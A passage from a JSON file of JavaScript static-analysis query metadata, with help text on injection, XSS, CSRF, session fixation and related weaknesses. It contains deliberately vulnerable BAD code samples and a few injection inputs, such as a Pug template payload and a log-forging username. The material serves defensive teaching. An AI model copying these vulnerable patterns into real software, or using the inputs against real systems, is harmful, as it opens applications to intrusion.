    "help": "# Insecure http parser\nStrict HTTP parsing may cause problems with interoperability with some non-conformant HTTP implementations. But disabling it is strongly discouraged, as it opens the door to several threats including HTTP Request Smuggling.\n\n\n## Recommendation\nDo not enable insecure http parser.\n\n\n## Example\nThe following example shows the instantiation of an http server. This server is vulnerable to HTTP Request Smuggling because the `insecureHTTPParser` option of the server instantiation is set to `true`. As a consequence, malformed packets may attempt to exploit any number of weaknesses including ranging from Web Cache Poisoning Attacks to bypassing firewall protection mecahanisms.\n\n\n```javascript\nconst http = require('node:http');\n\nhttp.createServer({\n    insecureHTTPParser: true\n}, (req, res) => {\n    res.end('hello world\\n');\n});\n```\nTo make sure that packets are parsed correctly, the `invalidHTTPParser` option should have its default value, or be explicitly set to `false`.\n\n\n## References\n* NodeJS: [February 20 Security Release](https://nodejs.org/en/blog/vulnerability/february-2020-security-releases)\n* Snyk: [NodeJS Critical HTTP Vulnerability](https://snyk.io/blog/node-js-release-fixes-a-critical-http-security-vulnerability/)\n* CWE-444: [HTTP Request/Response Smuggling](https://cwe.mitre.org/data/definitions/444.html)\n* Common Weakness Enumeration: [CWE-444](https://cwe.mitre.org/data/definitions/444.html).\n"
  },
  "js/indirect-command-line-injection": {
    "name": "Indirect uncontrolled command line",
    "description": "Forwarding command-line arguments to a child process executed within a shell may indirectly introduce command-line injection vulnerabilities.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 6.3,
    "precision": "medium",
    "id": "js/indirect-command-line-injection",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-078",
      "external/cwe/cwe-088"
    ],
    "filename": "5ab6110a-IndirectCommandInjection",
    "language": "javascript",
    "help": "# Indirect uncontrolled command line\nForwarding command-line arguments to `child_process.exec` or some other library routine that executes a system command within a shell can change the meaning of the command unexpectedly due to unescaped special characters.\n\nWhen the forwarded command-line arguments come from a parent process that has not escaped the special characters in the arguments, then the parent process may indirectly be vulnerable to command-line injection since the special characters are evaluated unexpectedly.\n\n\n## Recommendation\nIf possible, use APIs that don't run shell commands and accept command arguments as an array of strings rather than a single concatenated string. This is both safer and more portable.\n\nIf given arguments as a single string, avoid simply splitting the string on whitespace. Arguments may contain quoted whitespace, causing them to split into multiple arguments. Use a library like `shell-quote` to parse the string into an array of arguments instead.\n\nIf this approach is not viable, then add code to verify that each forwarded command-line argument is properly escaped before using it.\n\n\n## Example\nThe following wrapper script example executes another JavaScript file in a child process and forwards some command-line arguments. This is problematic because the special characters in the command-line arguments may change the meaning of the child process invocation unexpectedly. For instance, if one of the command-line arguments is `\"dollar$separated$name\"`, then the child process will substitute the two environment variables `$separated` and `$name` before invoking `node`.\n\n\n```javascript\nvar cp = require(\"child_process\");\n\nconst args = process.argv.slice(2);\nconst script = path.join(__dirname, 'bin', 'main.js');\ncp.execSync(`node ${script} ${args.join(' ')}`); // BAD\n\n```\nIf another program uses `child_process.execFile` to invoke the above wrapper script with input from a remote user, then there may be a command-line injection vulnerability. This may be surprising, since a command-line invocation with `child_process.execFile` is generally considered safe. But in this case, the remote user input is simply forwarded to the problematic `process.exec` call in the wrapper script.\n\nTo guard against this, use an API that does not perform environment variable substitution, such as `child_process.execFile`:\n\n\n```javascript\nvar cp = require(\"child_process\");\n\nconst args = process.argv.slice(2);\nconst script = path.join(__dirname, 'bin', 'main.js');\ncp.execFileSync('node', [script].concat(args)); // GOOD\n\n```\nIf you want to allow the user to specify other options to `node`, you can use a library like `shell-quote` to parse the user input into an array of arguments without risking command injection:\n\n\n```javascript\nvar cp = require(\"child_process\"),\n    shellQuote = require(\"shell-quote\");\n\nconst args = process.argv.slice(2);\nlet nodeOpts = '';\nif (args[0] === '--node-opts') {\n    nodeOpts = args[1];\n    args.splice(0, 2);\n}\nconst script = path.join(__dirname, 'bin', 'main.js');\ncp.execFileSync('node', shellQuote.parse(nodeOpts).concat(script).concat(args)); // GOOD\n\n```\n\n## References\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* npm: [shell-quote](https://www.npmjs.com/package/shell-quote).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).\n"
  },
  "js/missing-token-validation": {
    "name": "Missing CSRF middleware",
    "description": "Using cookies without CSRF protection may allow malicious websites to submit requests on behalf of the user.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 8.8,
    "precision": "high",
    "id": "js/missing-token-validation",
    "tags": [
      "security",
      "external/cwe/cwe-352"
    ],
    "filename": "0de204d8-MissingCsrfMiddleware",
    "language": "javascript",
    "help": "# Missing CSRF middleware\nWebsites that rely on cookie-based authentication may be vulnerable to cross-site request forgery (CSRF). Specifically, a state-changing request should include a secret token so the request can't be forged by an attacker. Otherwise, unwanted requests can be submitted on behalf of a user who visits a malicious website.\n\nThis is typically mitigated by embedding a session-specific secret token in each request. This token is then checked as an additional authentication measure. A malicious website should have no way of guessing the correct token to embed in the request.\n\n\n## Recommendation\nUse a middleware package such as `lusca.csrf` to protect against CSRF attacks.\n\n\n## Example\nIn the example below, the server authenticates users before performing the `changeEmail` POST action:\n\n\n```javascript\nconst app = require(\"express\")(),\n  cookieParser = require(\"cookie-parser\"),\n  bodyParser = require(\"body-parser\"),\n  session = require(\"express-session\");\n\napp.use(cookieParser());\napp.use(bodyParser.urlencoded({ extended: false }));\napp.use(session({ secret: process.env['SECRET'], cookie: { maxAge: 60000 } }));\n\n// ...\n\napp.post(\"/changeEmail\", function(req, res) {\n  const userId = req.session.id;\n  const email = req.body[\"email\"];\n  // ... update email associated with userId\n});\n\n```\nThis is not secure. An attacker can submit a POST `changeEmail` request on behalf of a user who visited a malicious website. Since authentication happens without any action from the user, the `changeEmail` action would be executed, despite not being initiated by the user.\n\nThis vulnerability can be mitigated by installing a CSRF protecting middleware handler:\n\n\n```javascript\nconst app = require(\"express\")(),\n  cookieParser = require(\"cookie-parser\"),\n  bodyParser = require(\"body-parser\"),\n  session = require(\"express-session\"),\n  csrf = require('lusca').csrf;\n\napp.use(cookieParser());\napp.use(bodyParser.urlencoded({ extended: false }));\napp.use(session({ secret: process.env['SECRET'], cookie: { maxAge: 60000 } }));\napp.use(csrf());\n\n// ...\n\napp.post(\"/changeEmail\", function(req, res) {\n  const userId = req.session.id;\n  const email = req.body[\"email\"];\n  // ... update email associated with userId\n});\n\n```\n\n## References\n* OWASP: [Cross-Site Request Forgery (CSRF)](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))\n* NPM: [lusca](https://www.npmjs.com/package/lusca)\n* Common Weakness Enumeration: [CWE-352](https://cwe.mitre.org/data/definitions/352.html).\n"
  },
  "js/incorrect-suffix-check": {
    "name": "Incorrect suffix check",
    "description": "Using indexOf to implement endsWith functionality is error-prone if the -1 case is not explicitly handled.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "high",
    "id": "js/incorrect-suffix-check",
    "tags": [
      "security",
      "correctness",
      "external/cwe/cwe-020"
    ],
    "filename": "bc247e13-IncorrectSuffixCheck",
    "language": "javascript",
    "help": "# Incorrect suffix check\nThe `indexOf` and `lastIndexOf` methods are sometimes used to check if a substring occurs at a certain position in a string. However, if the returned index is compared to an expression that might evaluate to -1, the check may pass in some cases where the substring was not found at all.\n\nSpecifically, this can easily happen when implementing `endsWith` using `indexOf`.\n\n\n## Recommendation\nUse `String.prototype.endsWith` if it is available. Otherwise, explicitly handle the -1 case, either by checking the relative lengths of the strings, or by checking if the returned index is -1.\n\n\n## Example\nThe following example uses `lastIndexOf` to determine if the string `x` ends with the string `y`:\n\n\n```javascript\nfunction endsWith(x, y) {\n  return x.lastIndexOf(y) === x.length - y.length;\n}\n\n```\nHowever, if `y` is one character longer than `x`, the right-hand side `x.length - y.length` becomes -1, which then equals the return value of `lastIndexOf`. This will make the test pass, even though `x` does not end with `y`.\n\nTo avoid this, explicitly check for the -1 case:\n\n\n```javascript\nfunction endsWith(x, y) {\n  let index = x.lastIndexOf(y);\n  return index !== -1 && index === x.length - y.length;\n}\n\n```\n\n## References\n* MDN: [String.prototype.endsWith](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/endsWith)\n* MDN: [String.prototype.indexOf](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/indexOf)\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "js/user-controlled-bypass-more-sources": {
    "name": "User-controlled bypass of security check with additional heuristic sources",
    "description": "Conditions that the user controls are not suited for making security-related decisions.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "medium",
    "id": "js/user-controlled-bypass-more-sources",
    "tags": [
      "experimental",
      "security",
      "external/cwe/cwe-807",
      "external/cwe/cwe-290"
    ],
    "filename": "6a971720-ConditionalBypass",
    "language": "javascript",
    "help": "# User-controlled bypass of security check with additional heuristic sources\nUsing user-controlled data in a permissions check may allow a user to gain unauthorized access to protected functionality or data.\n\n\n## Recommendation\nWhen checking whether a user is authorized for a particular activity, do not use data that is entirely controlled by that user in the permissions check. If necessary, always validate the input, ideally against a fixed list of expected values.\n\nSimilarly, do not decide which permission to check for, based on user data. In particular, avoid using computation to decide which permissions to check for. Use fixed permissions for particular actions, rather than generating the permission to check for.\n\n\n## Example\nIn this example, we have a server that shows private information for a user, based on the request parameter `userId`. For privacy reasons, users may only view their own private information, so the server checks that the request parameter `userId` matches a cookie value for the user who is logged in.\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.cookies.loggedInUserId !== req.params.userId) {\n        // BAD: login decision made based on user controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\nThis security check is, however, insufficient since an attacker can craft their cookie values to match those of any user. To prevent this, the server can cryptographically sign the security critical cookie values:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.signedCookies.loggedInUserId !== req.params.userId) {\n        // GOOD: login decision made based on server controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-807](https://cwe.mitre.org/data/definitions/807.html).\n* Common Weakness Enumeration: [CWE-290](https://cwe.mitre.org/data/definitions/290.html).\n"
  },
  "js/reflected-xss": {
    "name": "Reflected cross-site scripting",
    "description": "Writing user input directly to an HTTP response allows for a cross-site scripting vulnerability.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "high",
    "id": "js/reflected-xss",
    "tags": [
      "security",
      "external/cwe/cwe-079",
      "external/cwe/cwe-116"
    ],
    "filename": "bc37419c-ReflectedXss",
    "language": "javascript",
    "help": "# Reflected cross-site scripting\nDirectly writing user input (for example, an HTTP request parameter) to an HTTP response without properly sanitizing the input first, allows for a cross-site scripting vulnerability.\n\nThis kind of vulnerability is also called *reflected* cross-site scripting, to distinguish it from other types of cross-site scripting.\n\n\n## Recommendation\nTo guard against cross-site scripting, consider using contextual output encoding/escaping before writing user input to the response, or one of the other solutions that are mentioned in the references.\n\n\n## Example\nThe following example code writes part of an HTTP request (which is controlled by the user) directly to the response. This leaves the website vulnerable to cross-site scripting.\n\n\n```javascript\nvar app = require('express')();\n\napp.get('/user/:id', function(req, res) {\n  if (!isValidUserId(req.params.id))\n    // BAD: a request parameter is incorporated without validation into the response\n    res.send(\"Unknown user: \" + req.params.id);\n  else\n    // TODO: do something exciting\n    ;\n});\n\n```\nSanitizing the user-controlled data prevents the vulnerability:\n\n\n```javascript\nvar escape = require('escape-html');\n\nvar app = require('express')();\n\napp.get('/user/:id', function(req, res) {\n  if (!isValidUserId(req.params.id))\n    // GOOD: request parameter is sanitized before incorporating it into the response\n    res.send(\"Unknown user: \" + escape(req.params.id));\n  else\n    // TODO: do something exciting\n    ;\n});\n\n```\n\n## References\n* OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n* OWASP [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).\n* Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "js/incomplete-hostname-regexp": {
    "name": "Incomplete regular expression for hostnames",
    "description": "Matching a URL or hostname against a regular expression that contains an unescaped dot as part of the hostname might match more hostnames than expected.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "id": "js/incomplete-hostname-regexp",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-020"
    ],
    "filename": "bc247e13-IncompleteHostnameRegExp",
    "language": "javascript",
    "help": "# Incomplete regular expression for hostnames\nSanitizing untrusted URLs is an important technique for preventing attacks such as request forgeries and malicious redirections. Often, this is done by checking that the host of a URL is in a set of allowed hosts.\n\nIf a regular expression implements such a check, it is easy to accidentally make the check too permissive by not escaping the `.` meta-characters appropriately. Even if the check is not used in a security-critical context, the incomplete check may still cause undesirable behaviors when it accidentally succeeds.\n\n\n## Recommendation\nEscape all meta-characters appropriately when constructing regular expressions for security checks, and pay special attention to the `.` meta-character.\n\n\n## Example\nThe following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains.\n\n\n```javascript\napp.get('/some/path', function(req, res) {\n    let url = req.param('url'),\n        host = urlLib.parse(url).host;\n    // BAD: the host of `url` may be controlled by an attacker\n    let regex = /^((www|beta).)?example.com/;\n    if (host.match(regex)) {\n        res.redirect(url);\n    }\n});\n\n```\nThe check is however easy to bypass because the unescaped `.` allows for any character before `example.com`, effectively allowing the redirect to go to an attacker-controlled domain such as `wwwXexample.com`.\n\nAddress this vulnerability by escaping `.` appropriately: `let regex = /^((www|beta)\\.)?example\\.com/`.\n\n\n## References\n* MDN: [Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions)\n* OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)\n* OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "js/xss-through-dom": {
    "name": "DOM text reinterpreted as HTML",
    "description": "Reinterpreting text from the DOM as HTML can lead to a cross-site scripting vulnerability.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 6.1,
    "precision": "high",
    "id": "js/xss-through-dom",
    "tags": [
      "security",
      "external/cwe/cwe-079",
      "external/cwe/cwe-116"
    ],
    "filename": "bc37419c-XssThroughDom",
    "language": "javascript",
    "help": "# DOM text reinterpreted as HTML\nExtracting text from a DOM node and interpreting it as HTML can lead to a cross-site scripting vulnerability.\n\nA webpage with this vulnerability reads text from the DOM, and afterwards adds the text as HTML to the DOM. Using text from the DOM as HTML effectively unescapes the text, and thereby invalidates any escaping done on the text. If an attacker is able to control the safe sanitized text, then this vulnerability can be exploited to perform a cross-site scripting attack.\n\n\n## Recommendation\nTo guard against cross-site scripting, consider using contextual output encoding/escaping before writing text to the page, or one of the other solutions that are mentioned in the References section below.\n\n\n## Example\nThe following example shows a webpage using a `data-target` attribute to select and manipulate a DOM element using the JQuery library. In the example, the `data-target` attribute is read into the `target` variable, and the `$` function is then supposed to use the `target` variable as a CSS selector to determine which element should be manipulated.\n\n\n```javascript\n$(\"button\").click(function () {\n    var target = $(this).attr(\"data-target\");\n    $(target).hide();\n});\n\n```\nHowever, if an attacker can control the `data-target` attribute, then the value of `target` can be used to cause the `$` function to execute arbitrary JavaScript.\n\nThe above vulnerability can be fixed by using `$.find` instead of `$`. The `$.find` function will only interpret `target` as a CSS selector and never as HTML, thereby preventing an XSS attack.\n\n\n```javascript\n$(\"button\").click(function () {\n    var target = $(this).attr(\"data-target\");\n\t$.find(target).hide();\n});\n\n```\n\n## References\n* OWASP: [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).\n* OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n* OWASP [DOM Based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS).\n* OWASP [Types of Cross-Site Scripting](https://owasp.org/www-community/Types_of_Cross-Site_Scripting).\n* Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "js/unsafe-code-construction": {
    "name": "Unsafe code constructed from library input",
    "description": "Using externally controlled strings to construct code may allow a malicious user to execute arbitrary code.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 6.1,
    "precision": "medium",
    "id": "js/unsafe-code-construction",
    "tags": [
      "security",
      "external/cwe/cwe-094",
      "external/cwe/cwe-079",
      "external/cwe/cwe-116"
    ],
    "filename": "a2d22db7-UnsafeCodeConstruction",
    "language": "javascript",
    "help": "# Unsafe code constructed from library input\nWhen a library function dynamically constructs code in a potentially unsafe way, then it's important to document to clients of the library that the function should only be used with trusted inputs. If the function is not documented as being potentially unsafe, then a client may incorrectly use inputs containing unsafe code fragments, and thereby leave the client vulnerable to code-injection attacks.\n\n\n## Recommendation\nProperly document library functions that construct code from unsanitized inputs, or avoid constructing code in the first place.\n\n\n## Example\nThe following example shows two methods implemented using \\`eval\\`: a simple deserialization routine and a getter method. If untrusted inputs are used with these methods, then an attacker might be able to execute arbitrary code on the system.\n\n\n```javascript\nexport function unsafeDeserialize(value) {\n  return eval(`(${value})`);\n}\n\nexport function unsafeGetter(obj, path) {\n    return eval(`obj.${path}`);\n}\n\n```\nTo avoid this problem, either properly document that the function is potentially unsafe, or use an alternative solution such as \\`JSON.parse\\` or another library, like in the examples below, that does not allow arbitrary code to be executed.\n\n\n```javascript\nexport function safeDeserialize(value) {\n  return JSON.parse(value);\n}\n\nconst _ = require(\"lodash\");\nexport function safeGetter(object, path) {\n  return _.get(object, path);\n}\n\n```\n\n## References\n* OWASP: [Code Injection](https://www.owasp.org/index.php/Code_Injection).\n* Wikipedia: [Code Injection](https://en.wikipedia.org/wiki/Code_injection).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "js/regex-injection-more-sources": {
    "name": "Regular expression injection with additional heuristic sources",
    "description": "User input should not be used in regular expressions without first being escaped, otherwise a malicious user may be able to inject an expression that could require exponential time on certain inputs.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "js/regex-injection-more-sources",
    "tags": [
      "experimental",
      "security",
      "external/cwe/cwe-730",
      "external/cwe/cwe-400"
    ],
    "filename": "e910c77a-RegExpInjection",
    "language": "javascript",
    "help": "# Regular expression injection with additional heuristic sources\nConstructing a regular expression with unsanitized user input is dangerous as a malicious user may be able to modify the meaning of the expression. In particular, such a user may be able to provide a regular expression fragment that takes exponential time in the worst case, and use that to perform a Denial of Service attack.\n\n\n## Recommendation\nBefore embedding user input into a regular expression, use a sanitization function such as lodash's `_.escapeRegExp` to escape meta-characters that have special meaning.\n\n\n## Example\nThe following example shows a HTTP request parameter that is used to construct a regular expression without sanitizing it first:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/findKey', function(req, res) {\n  var key = req.param(\"key\"), input = req.param(\"input\");\n\n  // BAD: Unsanitized user input is used to construct a regular expression\n  var re = new RegExp(\"\\\\b\" + key + \"=(.*)\\n\");\n});\n\n```\nInstead, the request parameter should be sanitized first, for example using the function `_.escapeRegExp` from the lodash package. This ensures that the user cannot insert characters which have a special meaning in regular expressions.\n\n\n```javascript\nvar express = require('express');\nvar _ = require('lodash');\nvar app = express();\n\napp.get('/findKey', function(req, res) {\n  var key = req.param(\"key\"), input = req.param(\"input\");\n\n  // GOOD: User input is sanitized before constructing the regex\n  var safeKey = _.escapeRegExp(key);\n  var re = new RegExp(\"\\\\b\" + safeKey + \"=(.*)\\n\");\n});\n\n```\n\n## References\n* OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).\n* Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).\n* npm: [lodash](https://www.npmjs.com/package/lodash).\n* Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
  },
  "js/log-injection-more-sources": {
    "name": "Log injection with additional heuristic sources",
    "description": "Building log entries from user-controlled sources is vulnerable to insertion of forged log entries by a malicious user.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "medium",
    "id": "js/log-injection-more-sources",
    "tags": [
      "experimental",
      "security",
      "external/cwe/cwe-117"
    ],
    "filename": "77c3dc1f-LogInjection",
    "language": "javascript",
    "help": "# Log injection with additional heuristic sources\nIf unsanitized user input is written to a log entry, a malicious user may be able to forge new log entries.\n\nForgery can occur if a user provides some input with characters that are interpreted when the log output is displayed. If the log is displayed as a plain text file, then new line characters can be used by a malicious user. If the log is displayed as HTML, then arbitrary HTML may be included to spoof log entries.\n\n\n## Recommendation\nUser input should be suitably sanitized before it is logged.\n\nIf the log entries are in plain text then line breaks should be removed from user input, using `String.prototype.replace` or similar. Care should also be taken that user input is clearly marked in log entries.\n\nFor log entries that will be displayed in HTML, user input should be HTML-encoded before being logged, to prevent forgery and other forms of HTML injection.\n\n\n## Example\nIn the first example, a username, provided by the user, is logged using \\`console.info\\`. In the first case, it is logged without any sanitization. In the second case, the username is used to build an error that is logged using \\`console.error\\`. If a malicious user provides \\`username=Guest%0a\\[INFO\\]+User:+Admin%0a\\` as a username parameter, the log entry will be splitted in two different lines, where the second line will be \\`\\[INFO\\]+User:+Admin\\`.\n\n\n```javascript\nconst http = require('http');\nconst url = require('url');\n\nconst server = http.createServer((req, res) => {\n    let q = url.parse(req.url, true);\n\n    console.info(`[INFO] User: ${q.query.username}`); // BAD: User input logged as-is\n})\n\nserver.listen(3000, '127.0.0.1', () => {});\n\n```\nIn the second example, `String.prototype.replace` is used to ensure no line endings are present in the user input.\n\n\n```javascript\nconst http = require('http');\nconst url = require('url');\n\nconst server = http.createServer((req, res) => {\n    let q = url.parse(req.url, true);\n\n    // GOOD: remove newlines from user controlled input before logging\n    let username = q.query.username.replace(/\\n|\\r/g, \"\");\n\n    console.info(`[INFO] User: ${username}`);\n});\n\nserver.listen(3000, '127.0.0.1', () => {});\n\n```\n\n## References\n* OWASP: [Log Injection](https://www.owasp.org/index.php/Log_Injection).\n* Common Weakness Enumeration: [CWE-117](https://cwe.mitre.org/data/definitions/117.html).\n"
  },
  "js/code-injection-more-sources": {
    "name": "Code injection with additional heuristic sources",
    "description": "Interpreting unsanitized user input as code allows a malicious user arbitrary code execution.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.3,
    "precision": "high",
    "id": "js/code-injection-more-sources",
    "tags": [
      "experimental",
      "security",
      "external/cwe/cwe-094",
      "external/cwe/cwe-095",
      "external/cwe/cwe-079",
      "external/cwe/cwe-116"
    ],
    "filename": "6b225909-CodeInjection",
    "language": "javascript",
    "help": "# Code injection with additional heuristic sources\nDirectly evaluating user input (for example, an HTTP request parameter) as code without properly sanitizing the input first allows an attacker arbitrary code execution. This can occur when user input is treated as JavaScript, or passed to a framework which interprets it as an expression to be evaluated. Examples include AngularJS expressions or JQuery selectors.\n\n\n## Recommendation\nAvoid including user input in any expression which may be dynamically evaluated. If user input must be included, use context-specific escaping before including it. It is important that the correct escaping is used for the type of evaluation that will occur.\n\n\n## Example\nThe following example shows part of the page URL being evaluated as JavaScript code. This allows an attacker to provide JavaScript within the URL. If an attacker can persuade a user to click on a link to such a URL, the attacker can evaluate arbitrary JavaScript in the browser of the user to, for example, steal cookies containing session information.\n\n\n```javascript\neval(document.location.href.substring(document.location.href.indexOf(\"default=\")+8))\n\n```\nThe following example shows a Pug template being constructed from user input, allowing attackers to run arbitrary code via a payload such as `#{global.process.exit(1)}`.\n\n\n```javascript\nconst express = require('express')\nvar pug = require('pug');\nconst app = express()\n\napp.post('/', (req, res) => {\n    var input = req.query.username;\n    var template = `\ndoctype\nhtml\nhead\n    title= 'Hello world'\nbody\n    form(action='/' method='post')\n        input#name.form-control(type='text)\n        button.btn.btn-primary(type='submit') Submit\n    p Hello `+ input\n    var fn = pug.compile(template);\n    var html = fn();\n    res.send(html);\n})\n\n```\nBelow is an example of how to use a template engine without any risk of template injection. The user input is included via an interpolation expression `#{username}` whose value is provided as an option to the template, instead of being part of the template string itself:\n\n\n```javascript\nconst express = require('express')\nvar pug = require('pug');\nconst app = express()\n\napp.post('/', (req, res) => {\n    var input = req.query.username;\n    var template = `\ndoctype\nhtml\nhead\n    title= 'Hello world'\nbody\n    form(action='/' method='post')\n        input#name.form-control(type='text)\n        button.btn.btn-primary(type='submit') Submit\n    p Hello #{username}`\n    var fn = pug.compile(template);\n    var html = fn({username: input});\n    res.send(html);\n})\n\n```\n\n## References\n* OWASP: [Code Injection](https://www.owasp.org/index.php/Code_Injection).\n* Wikipedia: [Code Injection](https://en.wikipedia.org/wiki/Code_injection).\n* PortSwigger Research Blog: [Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n* Common Weakness Enumeration: [CWE-95](https://cwe.mitre.org/data/definitions/95.html).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "js/session-fixation": {
    "name": "Failure to abandon session",
    "description": "Reusing an existing session as a different user could allow an attacker to access someone else's account by using their session.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 5.0,
    "precision": "medium",
    "id": "js/session-fixation",
    "tags": [
      "security",
      "external/cwe/cwe-384"
    ],
    "filename": "8a6ac376-SessionFixation",
    "language": "javascript",
    "help": "# Failure to abandon session\nReusing a session could allow an attacker to gain unauthorized access to another account. Always ensure that, when a user logs in or out, the current session is abandoned so that a new session may be started.\n\n\n## Recommendation\nAlways use `req.session.regenerate(...);` to start a new session when a user logs in or out.\n\n\n## Example\nThe following example shows the previous session being used after authentication. This would allow a previous user to use the new user's account.\n\n\n```javascript\nconst express = require('express');\nconst session = require('express-session');\nvar bodyParser = require('body-parser')\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: false }))\napp.use(session({\n    secret: 'keyboard cat'\n}));\n\napp.post('/login', function (req, res) {\n    // Check that username password matches\n    if (req.body.username === 'admin' && req.body.password === 'admin') {\n        req.session.authenticated = true;\n        res.redirect('/');\n    } else {\n        res.redirect('/login');\n    }\n});\n```\nThis code example solves the problem by not reusing the session, and instead calling `req.session.regenerate()` to ensure that the session is not reused.\n\n\n```javascript\nconst express = require('express');\nconst session = require('express-session');\nvar bodyParser = require('body-parser')\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: false }))\napp.use(session({\n    secret: 'keyboard cat'\n}));\n\napp.post('/login', function (req, res) {\n    // Check that username password matches\n    if (req.body.username === 'admin' && req.body.password === 'admin') {\n        req.session.regenerate(function (err) {\n            if (err) {\n                res.send('Error');\n            } else {\n                req.session.authenticated = true;\n                res.redirect('/');\n            }\n        });\n    } else {\n        res.redirect('/login');\n    }\n});\n```\n\n## References\n* OWASP: [Session fixation](https://www.owasp.org/index.php/Session_fixation)\n* Stack Overflow: [Creating a new session after authentication with Passport](https://stackoverflow.com/questions/22209354/creating-a-new-session-after-authentication-with-passport/30468384#30468384)\n* jscrambler.com: [Best practices for secure session management in Node](https://blog.jscrambler.com/best-practices-for-secure-session-management-in-node)\n* Common Weakness Enumeration: [CWE-384](https://cwe.mitre.org/data/definitions/384.html).\n"
  },
  "js/untrusted-data-to-external-api-more-sources": {
    "name": "Untrusted data passed to external API with additional heuristic sources",
    "description": "Data provided remotely is used in this external API without sanitization, which could be a security risk.",
    "id": "js/untrusted-data-to-external-api-more-sources",
    "kind": "path-problem",
    "precision": "low",
    "problem.severity": "error",
    "security-severity": 7.8,
    "tags": [
      "experimental",
      "security",
      "external/cwe/cwe-20"
    ],
    "filename": "688bfa61-UntrustedDataToExternalAPI",
    "language": "javascript",
